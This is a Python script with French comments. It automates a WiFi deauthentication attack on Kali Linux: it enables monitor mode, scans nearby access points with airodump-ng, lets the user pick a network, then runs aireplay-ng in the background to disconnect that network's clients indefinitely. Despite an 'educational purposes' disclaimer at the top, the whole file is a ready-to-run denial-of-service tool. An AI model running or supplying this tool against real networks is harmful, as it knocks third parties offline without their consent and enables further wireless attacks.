#!/usr/bin/env python3
# Avertissement : Ce script est uniquement à des fins éducatives. Ne l'utilisez pas contre un réseau que vous ne possédez pas ou pour lequel vous n'avez pas d'autorisation de test.


# Nous utiliserons le module subprocess pour exécuter des commandes sur Kali Linux.
import subprocess
# Nous aurons besoin des expressions régulières.
import re
# Nous voulons ouvrir les fichiers CSV générés par airmon-ng, et nous utiliserons le module csv intégré.
import csv
# Nous voulons importer os car nous voulons vérifier sudo
import os
# Nous voulons utiliser time.sleep()
import time
# Nous voulons déplacer les fichiers .csv dans le dossier si nous en trouvons. Nous utiliserons shutil pour cela.
import shutil
# Créer un horodatage pour le nom de fichier .csv
from datetime import datetime

# Nous déclarons une liste vide où tous les réseaux sans fil actifs seront enregistrés.
reseaux_sans_fil_actifs = []

# Nous utilisons cette fonction pour tester si l'ESSID est déjà dans la liste. 
# Si c'est le cas, nous retournons False pour ne pas l'ajouter à nouveau.
def verifier_essid(essid, lst):
    statut_verification = True

    # S'il n'y a pas d'ESSID dans la liste, ajoutez la ligne
    if len(lst) == 0:
        return statut_verification

    # Cela ne s'exécutera que s'il y a des points d'accès sans fil dans la liste.
    for item in lst:
        # Si True, ne pas ajouter à la liste. False l'ajoutera à la liste
        if essid in item["ESSID"]:
            statut_verification = False

    return statut_verification

# En-tête de l'interface utilisateur de base
print(r"""FFFFFF   LL        AA     VV     VV   IIIII   OOOO  
FF       LL       A  A     VV   VV     III   O    O 
FFFFF    LL      AAAAAA     VV VV      III   O    O 
FF       LL     AA    AA     VVV       III   O    O 
FF       LLLLL AA      AA     V      IIIII    OOOO  """)
print("\n****************************************************************")
print("\n* Copyright de Flavio Fernandes                             *")
print("\n****************************************************************")


# Si l'utilisateur n'exécute pas le programme avec des privilèges super utilisateur, ne lui permettez pas de continuer.
if not 'SUDO_UID' in os.environ.keys():
    print("Essayez d'exécuter ce programme avec sudo.")
    exit()

# Déplacez tous les fichiers .csv dans le répertoire vers un dossier de sauvegarde.
for nom_fichier in os.listdir():
    # Nous ne devrions avoir qu'un seul fichier csv car nous les supprimons du dossier à chaque exécution du programme.
    if ".csv" in nom_fichier:
        print("Il ne devrait pas y avoir de fichiers .csv dans votre répertoire. Nous avons trouvé des fichiers .csv dans votre répertoire.")
        # Nous obtenons le répertoire de travail actuel.
        repertoire = os.getcwd()
        try:
            # Nous créons un nouveau répertoire appelé /backup
            os.mkdir(repertoire + "/backup/")
        except:
            print("Le dossier de sauvegarde existe.")
        # Créer un horodatage
        horodatage = datetime.now()
        # Nous copions tous les fichiers .csv dans le dossier de sauvegarde.
        shutil.move(nom_fichier, repertoire + "/backup/" + str(horodatage) + "-" + nom_fichier)

# Regex pour trouver les interfaces sans fil, nous faisons l'hypothèse qu'elles seront toutes wlan0 ou plus.
modele_wlan = re.compile("^(wlan[0-9]+|wlp[0-9a-z]+|wlx[0-9a-f]+)")


# Python nous permet d'exécuter des commandes système en utilisant une fonction fournie par le module subprocess. 
# subprocess.run(<liste des arguments de ligne de commande ici>, <spécifiez si vous voulez capturer la sortie>)
# Nous voulons capturer la sortie. La sortie sera en UTF-8 standard et nous la décoderons.
# Le script est le processus parent et crée un processus enfant qui exécute la commande système, et ne continuera que lorsque le processus enfant sera terminé.
# Nous exécutons la commande iwconfig pour rechercher des interfaces sans fil.
resultat_verification_wifi = modele_wlan.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

# Aucun adaptateur WiFi connecté. 
if len(resultat_verification_wifi) == 0:
    print("Veuillez connecter un contrôleur WiFi et réessayer.")
    exit()

# Menu pour sélectionner l'interface WiFi
print("Les interfaces WiFi suivantes sont disponibles :")
for index, item in enumerate(resultat_verification_wifi):
    print(f"{index} - {item}")

# Assurez-vous que l'interface WiFi sélectionnée est valide. Menu simple avec des interfaces à sélectionner.
while True:
    choix_interface_wifi = input("Veuillez sélectionner l'interface que vous souhaitez utiliser pour l'attaque : ")
    try:
        if resultat_verification_wifi[int(choix_interface_wifi)]:
            break
    except:
        print("Veuillez entrer un numéro correspondant aux choix.")

# Pour une référence facile, nous appelons l'interface choisie hacknic
hacknic = resultat_verification_wifi[int(choix_interface_wifi)]

# Tuer les processus WiFi conflictuels
print("Adaptateur WiFi connecté !\nMaintenant, tuons les processus conflictuels :")

# subprocess.run(<liste des arguments de ligne de commande ici>)
# Le script est le processus parent et crée un processus enfant qui exécute la commande système, et ne continuera que lorsque le processus enfant sera terminé.
# Nous exécutons la commande iwconfig pour rechercher des interfaces sans fil.
# Tuer tous les processus conflictuels en utilisant airmon-ng
tuer_processus_conflit =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# Mettre le WiFi en mode surveillé
print("Mettre l'adaptateur WiFi en mode surveillé :")
mettre_en_mode_surveille = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

# subprocess.Popen(<liste des arguments de ligne de commande ici>)
# La méthode Popen ouvre un tuyau à partir d'une commande. La sortie est un fichier ouvert qui peut être accédé par d'autres programmes.
# Nous exécutons la commande iwconfig pour rechercher des interfaces sans fil.
# Découvrir les points d'accès
decouvrir_points_acces = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Boucle qui affiche les points d'accès sans fil. Nous utilisons un bloc try except et nous quitterons la boucle en appuyant sur ctrl-c.
try:
    while True:
        # Nous voulons effacer l'écran avant d'imprimer les interfaces réseau.
        subprocess.call("clear", shell=True)
        for nom_fichier in os.listdir():
                # Nous ne devrions avoir qu'un seul fichier csv car nous sauvegardons tous les fichiers csv précédents du dossier à chaque exécution du programme. 
                # La liste suivante contient les noms de champs pour les entrées csv.
                noms_champs = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in nom_fichier:
                    with open(nom_fichier) as csv_h:
                        # Nous utilisons la méthode DictReader et lui disons de prendre le contenu de csv_h puis d'appliquer le dictionnaire avec les noms de champs que nous avons spécifiés ci-dessus. 
                        # Cela crée une liste de dictionnaires avec les clés spécifiées dans les noms de champs.
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=noms_champs)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif verifier_essid(row["ESSID"], reseaux_sans_fil_actifs):
                                reseaux_sans_fil_actifs.append(row)

        print("Analyse en cours. Appuyez sur Ctrl+C lorsque vous souhaitez sélectionner le réseau sans fil que vous souhaitez attaquer.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(reseaux_sans_fil_actifs):
            # Nous utilisons l'instruction print avec une f-string. 
            # Les f-strings sont une manière plus intuitive d'inclure des variables lors de l'impression de chaînes, 
            # plutôt que des concaténations laides.
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        # Nous faisons dormir le script pendant 1 seconde avant de charger la liste mise à jour.
        time.sleep(1)

except KeyboardInterrupt:
    print("\nPrêt à faire un choix.")

# Assurez-vous que le choix d'entrée est valide.
while True:
    choix = input("Veuillez sélectionner un choix parmi ceux ci-dessus : ")
    try:
        if reseaux_sans_fil_actifs[int(choix)]:
            break
    except:
        print("Veuillez réessayer.")

# Pour faciliter le travail, nous assignons les résultats à des variables.
hackbssid = reseaux_sans_fil_actifs[int(choix)]["BSSID"]
hackchannel = reseaux_sans_fil_actifs[int(choix)]["channel"].strip()

# Changer pour le canal sur lequel nous voulons effectuer l'attaque DOS. 
# La surveillance se fait sur un canal différent et nous devons le régler sur ce canal. 
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

# Désauthentifier les clients. Nous l'exécutons avec Popen et nous envoyons la sortie à subprocess.DEVNULL et les erreurs à subprocess.DEVNULL. Nous exécuterons donc la désauthentification en arrière-plan.
subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, resultat_verification_wifi[int(choix_interface_wifi)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 

# Nous exécutons une boucle infinie que vous pouvez quitter en appuyant sur ctrl-c. La désauthentification s'arrêtera lorsque nous arrêterons le script.
try:
    while True:
        print("Désauthentification des clients, appuyez sur ctrl-c pour arrêter")
except KeyboardInterrupt:
    print("Arrêter le mode surveillance")
    # Nous exécutons une commande subprocess.run où nous arrêtons le mode surveillance sur l'adaptateur réseau.
    subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
    print("Merci ! Sortie en cours") 